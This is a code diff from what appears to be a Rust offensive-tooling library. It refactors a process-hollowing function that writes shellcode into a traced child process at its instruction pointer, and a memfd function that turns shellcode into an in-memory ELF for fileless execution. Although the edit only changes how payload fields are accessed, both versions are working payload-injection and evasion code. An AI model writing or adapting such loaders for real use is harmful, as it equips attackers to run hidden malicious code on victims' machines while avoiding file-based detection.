@@ -46,12 +46,12 @@ use exeutils::elf64;
 ///     eprintln!("An error occurred: {:?}", e);
 /// }
 /// ```
-pub fn hollow(payload: Payload) -> Result<()> {
+pub fn hollow(payload: Payload<New>) -> Result<()> {
     match unsafe { fork() } {
         Ok(ForkResult::Parent { child, .. }) => {
             waitpid(child, None)?;
 
-            match payload.payload_type {
+            match payload.payload_type() {
                 PayloadType::Executable => {
                     return Err(Error::NotImplemented(
                         "hollow can not take executables".to_string(),
@@ -62,7 +62,7 @@ pub fn hollow(payload: Payload) -> Result<()> {
 
                     let mut addr = regs.rip;
 
-                    for byte in &payload.bytes {
+                    for byte in payload.bytes() {
                         ptrace::write(child, addr as *mut c_void, i64::from(*byte))?;
                         addr += 1;
                     }
@@ -75,9 +75,9 @@ pub fn hollow(payload: Payload) -> Result<()> {
         Ok(ForkResult::Child) => {
             ptrace::traceme()?;
 
-            let target_c_string = CString::new(payload.target)?;
+            let target_c_string = CString::new(payload.target())?;
 
-            let target_args = str_to_vec_c_string(&payload.target_args)?;
+            let target_args = str_to_vec_c_string(payload.target_args())?;
             let target_args_slice = target_args.as_slice();
 
             let env = get_env()?;
@@ -129,14 +129,14 @@ pub fn memfd(payload: Payload<New>) -> Result<()> {
 
     let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
 
-    let bytes = match payload.payload_type {
-        PayloadType::Executable => payload.bytes,
-        PayloadType::Shellcode => elf64::shellcode_to_exe(&payload.bytes),
+    let bytes = match payload.payload_type() {
+        PayloadType::Executable => payload.bytes().to_vec(),
+        PayloadType::Shellcode => elf64::shellcode_to_exe(payload.bytes()),
     };
 
     unistd::write(&fd, &bytes)?;
 
-    let args = str_to_vec_c_string(&payload.args())?;
+    let args = str_to_vec_c_string(payload.args())?;
     let args_slice = args.as_slice();
 
     let env = get_env()?;
